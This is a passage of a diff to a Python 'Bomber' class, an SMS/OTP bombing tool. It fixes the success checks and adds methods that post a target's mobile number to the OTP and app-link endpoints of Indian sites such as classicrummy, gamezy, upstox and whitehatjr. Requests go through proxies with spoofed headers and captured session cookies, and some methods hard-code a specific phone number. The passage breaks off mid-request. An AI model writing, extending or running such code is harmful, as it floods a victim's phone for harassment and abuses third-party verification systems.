@@ -204,7 +204,7 @@ class Bomber:
                                    'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def upchar(self):
@@ -230,7 +230,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def tata(self):
@@ -261,7 +261,7 @@ class Bomber:
                                        'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def snapdeal(self):
@@ -286,7 +286,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def pharmeasy(self):
@@ -315,7 +315,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def okcredit(self):
@@ -343,7 +343,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def naaptol(self):
@@ -371,7 +371,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def lenskart(self):
@@ -400,7 +400,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def justdial(self):
@@ -428,7 +428,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def jobhai(self):
@@ -456,7 +456,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def indiamart(self):
@@ -480,7 +480,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def icq(self):
@@ -505,7 +505,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def dealshare(self):
@@ -530,7 +530,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def confirmtkt(self):
@@ -552,7 +552,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def ajio(self):
@@ -578,7 +578,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def onecard(self):
@@ -609,7 +609,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def dMart(self):
@@ -635,7 +635,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def kreditBee(self):
@@ -664,7 +664,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def purplle(self):
@@ -693,7 +693,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def openBook(self):
@@ -721,7 +721,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def meesho(self):
@@ -748,7 +748,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def eka(self):
@@ -775,7 +775,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def old(self):
@@ -804,7 +804,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def netmeds(self):
@@ -828,7 +828,7 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
             return True
 
     def delhivery(self):
@@ -852,12 +852,478 @@ class Bomber:
                 'https': self.getproxy()})
         except:
             return False
-        if(request.status_code == 400):
+        if(request.status_code == 200):
+            return True
+
+    def classicRummy(self):
+        url = "https://www.classicrummy.com/system/ajax"
+        payload = f"mobile_number={self.user_mobile}&form_build_id=form-f2qL4Ts8iczLvHFU97qun6myVE80t27QYNqkhnD9fTU&form_id=janus_misc_mobile_download_form&_triggering_element_name=op&_triggering_element_value=Text%2Bme%2Blink&ajax_html_ids%255B%255D=mainContainer&ajax_html_ids%255B%255D=headerComponent&ajax_html_ids%255B%255D=block-panels-mini-header-panel&ajax_html_ids%255B%255D=mini-panel-header_panel&ajax_html_ids%255B%255D=logo&ajax_html_ids%255B%255D=header-login&ajax_html_ids%255B%255D=user-login-form&ajax_html_ids%255B%255D=user-login-block-container&ajax_html_ids%255B%255D=user-login-block-form-fields&ajax_html_ids%255B%255D=edit-name&ajax_html_ids%255B%255D=edit-pass&ajax_html_ids%255B%255D=edit-submit&ajax_html_ids%255B%255D=edit-actions--2&ajax_html_ids%255B%255D=disremember&ajax_html_ids%255B%255D=menu-icon&ajax_html_ids%255B%255D=m-menu&ajax_html_ids%255B%255D=mobile-logo&ajax_html_ids%255B%255D=mobile-logo-button&ajax_html_ids%255B%255D=mainComponent&ajax_html_ids%255B%255D=contentContainer&ajax_html_ids%255B%255D=menuContainer&ajax_html_ids%255B%255D=navComponent&ajax_html_ids%255B%255D=block-system-main-menu&ajax_html_ids%255B%255D=support-menu&ajax_html_ids%255B%255D=block-block-35&ajax_html_ids%255B%255D=content&ajax_html_ids%255B%255D=main-content&ajax_html_ids%255B%255D=page-title&ajax_html_ids%255B%255D=page-content&ajax_html_ids%255B%255D=forgot-pass-wrapper&ajax_html_ids%255B%255D=block-janus-player-password-forgot-password-form&ajax_html_ids%255B%255D=user-pass&ajax_html_ids%255B%255D=edit-name--2&ajax_html_ids%255B%255D=edit-actions--3&ajax_html_ids%255B%255D=edit-submit--2&ajax_html_ids%255B%255D=block-block-59&ajax_html_ids%255B%255D=mobile-download-form-wrapper&ajax_html_ids%255B%255D=janus-misc-mobile-download-form&ajax_html_ids%255B%255D=app-download-mobile-number&ajax_html_ids%255B%255D=edit-actions--6&ajax_html_ids%255B%255D=text-me-link-button&ajax_html_ids%255B%255D=block-block-145&ajax_html_ids%255B%255D=block-block-146&ajax_html_ids%255B%255D=footer&ajax_html_ids%255B%255D=block-panels-mini-footer-new&ajax_html_ids%255B%255D=mini-panel-footer_new&ajax_html_ids%255B%255D=footer-icons-row&ajax_html_ids%255B%255D=block-block-44&ajax_html_ids%255B%255D=block-block-55&ajax_html_ids%255B%255D=block-block-32&ajax_html_ids%255B%255D=block-block-63&ajax_html_ids%255B%255D=scroll&ajax_html_ids%255B%255D=block-menu-menu-mobile-menu&ajax_html_ids%255B%255D=pro-app-login-menu&ajax_html_ids%255B%255D=block-block-46&ajax_html_ids%255B%255D=&ajax_page_state%255Btheme%255D=classicrummy&ajax_page_state%255Btheme_token%255D=PB6XRIz-CJlvS52RdoZSb0311T5ohPa-L20-NTmrolw&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.base.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.menus.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.messages.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.theme.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.core.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.theme.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.button.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.resizable.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.dialog.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fcomment%252Fcomment.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fdate%252Fdate_api%252Fdate.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fdate%252Fdate_popup%252Fthemes%252Fdatepicker.1.7.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Ffield%252Ftheme%252Ffield.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fnode%252Fnode.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsearch%252Fsearch.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fuser%252Fuser.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fviews%252Fcss%252Fviews.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fcss%252Fctools.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fcss%252Fmodal.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fcss%252Fmodal_forms_popup.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fpanels%252Fcss%252Fpanels.css%255D=1&ajax_page_state%255Bcss%255D%255Bpublic%253A%252F%252Fctools%252Fcss%252Fa94005f3b3faf8b5f805bee88c8ddd8c.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fpanels%252Fplugins%252Flayouts%252Fflexible%252Fflexible.css%255D=1&ajax_page_state%255Bcss%255D%255Bpublic%253A%252F%252Fctools%252Fcss%252Fc666ced32588108b7d69c92ac0646471.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fresponsive_menus%252Fstyles%252Fresponsive_menus_simple%252Fcss%252Fresponsive_menus_simple.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fsystem.menus.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmaterial.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fdefault.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Ffrontpage.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fnavigation.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252FmCustomScrollbar.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmain.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fcashier.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fcontent.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fpromotions.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Ftablet.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmobile.css%255D=1&ajax_page_state%255Bjs%255D%255B0%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fjquery%252F1.7%252Fjquery.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-extend-3.4.0.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-html-prefilter-3.5.0-backport.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery.once.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fdrupal.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.core.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.widget.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fexternal%252Fjquery.cookie.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fmisc%252Fjquery.form.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-ajaxsubmit.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.button.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.mouse.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.draggable.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.position.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.resizable.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.dialog.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fdialog%252Fmisc%252Fajax.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Fjs%252Fjquery_update.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fjs%252Fmodal_forms_login.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fprogress.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fjs%252Fmodal.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fjs%252Fmodal_forms_popup.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fcustom%252Fjanus_geoip_location%252Fjanus_geoip_location_non_logged_in.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fresponsive_menus%252Fstyles%252Fresponsive_menus_simple%252Fjs%252Fresponsive_menus_simple.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fmaterial.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252FmCustomScrollbar.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252FmaterialInput.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Frummy.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fmenu.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fresponsiveslides.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fjquery.bxslider.js%255D=1&ajax_page_state%255Bjquery_version%255D=1.7"
+        headers = {
+            'authority': "www.classicrummy.com",
+            'accept': "application/json, text/javascript, */*; q=0.01",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+            'cookie': "SSESS1fdfcf5c80973e7d4bd24919e70fdb5b=gvS7RgeOO1x72oDtzpqBMYUZFGn3c0Y53bksRHgiiT0; _gcl_au=1.1.1901828536.1654657153; has_js=1; geolocation_status_flag=; _ga=GA1.1.1135017572.1654657153; _ga_7BVTR4SXQZ=GS1.1.1654657152.1.1.1654657164.48",
+            'dnt': "1",
+            'origin': "https://www.classicrummy.com",
+            'referer': "https://www.classicrummy.com/play-rummy-games-on-mobile",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-requested-with': "XMLHttpRequest"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def classicRummy2(self):
+        url = "https://www.classicrummy.com/mobile_generate_otp"
+        payload = f"mobile={self.user_mobile}"
+        headers = {
+            'authority': "www.classicrummy.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+            'cookie': "SSESS1fdfcf5c80973e7d4bd24919e70fdb5b=gvS7RgeOO1x72oDtzpqBMYUZFGn3c0Y53bksRHgiiT0; _gcl_au=1.1.1901828536.1654657153; has_js=1; geolocation_status_flag=; _ga=GA1.1.1135017572.1654657153; _ga_7BVTR4SXQZ=GS1.1.1654657152.1.1.1654657284.60",
+            'dnt': "1",
+            'origin': "https://www.classicrummy.com",
+            'referer': "https://www.classicrummy.com/register",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-requested-with': "XMLHttpRequest"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def nnow(self):
+        url = "https://api.nnnow.com/d/apiV2/otp/resendOtp/v1/flash"
+        monumber = 7984430992
+        payload = "{\"mobileNumber\":"f'"{monumber}"'",\"otpTemplateId\":\"5b4e2e49b70e040008ffbcbe\",\"sessionId\":\"62a01603ead555000c4bca6a\"}"
+        headers = {
+            'cookie': "sess_map=vvyfuxavqcycbtwyfraxtawdwarwzravbesfcabuaxtsrysvduadqdquavtvuxybytbbwzbyucqexbucyfuzqfruvbtsvcdsbrqzbfxdazttzbdqqttuaeqaxredfryavfwfbvetqsdbueqsvuqdebwcfqedddfv",
+            'Accept-Language': "en-US,en;q=0.9",
+            'Connection': "keep-alive",
+            'Content-Type': "application/json",
+            'DNT': "1",
+            'Origin': "https://www.nnnow.com",
+            'Referer': "https://www.nnnow.com/",
+            'Sec-Fetch-Dest': "empty",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Site': "same-site",
+            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'accept': "application/json",
+            'bbversion': "v2",
+            'clientSessionId': "1662729304519",
+            'correlationId': "932406e5-6454-4dca-8760-ddc0856e9626",
+            'module': "odin",
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def gamezy(self):
+        url = "https://www.gamezy.com/api/auth/getOTP"
+        payload = "{\"verificationChannel\":\"2\",\"mobile\":"f'"{self.user_mobile}"'"}"
+        headers = {
+            'authority': "www.gamezy.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json;charset=UTF-8",
+            'cookie': "_gcl_au=1.1.2117215327.1654659285; _ga=GA1.1.1702043227.1654659285; _ga_PZRQFL09FN=GS1.1.1654659285.1.0.1654659293.0; gk-session-id=edba0488-4f64-4812-98b6-fd917ce802ee; WZRK_G=351f48773905445389decdde47510e71; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1654659295%2C%22t%22%3A1654659294%7D",
+            'dnt': "1",
+            'origin': "https://www.gamezy.com",
+            'referer': "https://www.gamezy.com/game/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def gamezzy(self):
+        url = "https://www.gamezy.com/api/user/sendAppDownloadLinkV1"
+        monumber = 7984430992
+        payload = "{\"mobile\":"f'"{monumber}"'"}"
+        headers = {
+            'authority': "www.gamezy.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'cookie': "_gcl_au=1.1.2117215327.1654659285; _ga=GA1.1.1702043227.1654659285; gk-session-id=edba0488-4f64-4812-98b6-fd917ce802ee; WZRK_G=351f48773905445389decdde47510e71; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1654659295%2C%22t%22%3A1654659299%7D; _ga_PZRQFL09FN=GS1.1.1654659285.1.1.1654659392.0",
+            'dnt': "1",
+            'origin': "https://www.gamezy.com",
+            'referer': "https://www.gamezy.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def upstocks(self):
+        url = "https://service.upstox.com/login/open/v3/auth/1fa/otp/generate"
+
+        querystring = {"requestId": "WPRO-b07825c9c2"}
+        monumber = 7984430992
+        payload = "{\"data\":{\"mobileNumber\":"f'"{monumber}"'"}}"
+        headers = {
+            'cookie': "_gcl_au=1.1.1498453583.1654659024; WZRK_G=524d0c9d0f464abd8677becdbcfef577; _ga=GA1.1.646571292.1654659025; WZRK_S_4W7-R7R-KR5Z=%7B%22p%22%3A1%2C%22s%22%3A1654659025%2C%22t%22%3A1654659025%7D; lead_phone_number=9090909091; _cfuvid=aDSwK6UkDVifGOdOgFmHyoT4IS0wQNQTZiHprSI31ZM-1654659036156-0-604800000; _ga_VFG6NNXYGT=GS1.1.1654659024.1.0.1654659035.0; _uetsid=555b0590e6db11ec802a9d8db14d525e; _uetvid=555b2fe0e6db11eca666d9c8f6b73347",
+            'authority': "service.upstox.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'dnt': "1",
+            'origin': "https://login.upstox.com",
+            'referer': "https://login.upstox.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-device-details': "platform=WEB|osName=Android/6.0|osVersion=Edge/102.0.1245.33|appVersion=4.0.0|modelName=Edge|manufacturer=LG"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def whitehatjr(self):
+        url = "https://api.whitehatjr.com/api/V1/otp/generate"
+
+        querystring = {"deviceId": "4332e115-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659767130", "_vercel_no_cache": "1"}
+        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'"}"
+        headers = {
+            'authority': "api.whitehatjr.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json;charset=UTF-8",
+            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660667012&rum=0",
+            'dnt': "1",
